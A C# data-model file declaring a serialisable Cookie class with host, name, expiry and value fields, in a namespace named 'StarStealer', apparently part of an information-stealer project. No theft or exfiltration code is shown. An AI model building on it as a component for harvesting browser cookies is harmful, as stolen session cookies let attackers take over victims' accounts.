using System.Runtime.Serialization;

namespace StarStealer.Models
{
    [DataContract]
    class Cookie
    {
        [DataMember]
        public string Host { get; set; }
        [DataMember]
        public string Name { get; set; }
        [DataMember]
        public string ExpiresUTC { get; set; }
        [DataMember]
        public string Value { get; set; }
    }
}
